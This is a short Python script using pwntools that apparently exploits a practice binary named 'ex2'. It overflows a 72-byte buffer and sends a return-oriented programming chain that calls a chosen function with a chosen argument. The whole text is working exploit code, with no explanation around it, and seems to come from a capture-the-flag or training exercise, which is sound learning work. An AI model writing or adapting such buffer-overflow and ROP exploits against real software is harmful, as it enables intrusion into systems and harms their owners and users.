from pwn import *

p = process('./bin/ex2')

souldream_addr = 0x404060
dream_msg_addr = 0x4011b6
pop_rdi_pop_rbp_ret = 0x4012b5

buffer_size = 72
padding = b'A' * buffer_size

payload = padding + p64(pop_rdi_pop_rbp_ret) + p64(souldream_addr) + p64(0x0) + p64(dream_msg_addr)

p.sendline(payload)
p.interactive()
